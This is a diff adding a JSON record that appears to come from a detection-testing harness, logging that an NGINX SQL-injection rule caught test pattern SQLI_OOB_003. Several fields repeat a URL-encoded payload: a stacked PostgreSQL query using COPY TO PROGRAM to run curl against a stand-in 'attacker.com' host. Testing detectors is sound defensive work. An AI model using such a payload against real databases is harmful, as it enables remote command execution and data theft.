@@ -1,0 +1,17 @@
+{
+  "pattern_id": "SQLI_OOB_003",
+  "test_id": "SQLI_OOB_003-1770841898425-nx9o3",
+  "category": "sqli",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 32000,
+  "evidence": "20:31:38.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_OOB_003-1770841898425-nx9o3 pattern_id=SQLI_OOB_003 uri=/?q='%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'-- client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_OOB_003-1770841898425-nx9o3 pattern_id=SQLI_OOB_003 uri=/?q='%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'-- client=127.0.0.1 method=GET",
+  "expected_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_OOB_003-1770841898425-nx9o3 pattern_id=SQLI_OOB_003 uri=/?q='%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'-- client=127.0.0.1 method=GET",
+  "sent_at": 1770841930000,
+  "detected_at": 1770841898000,
+  "status": "passed"
+}
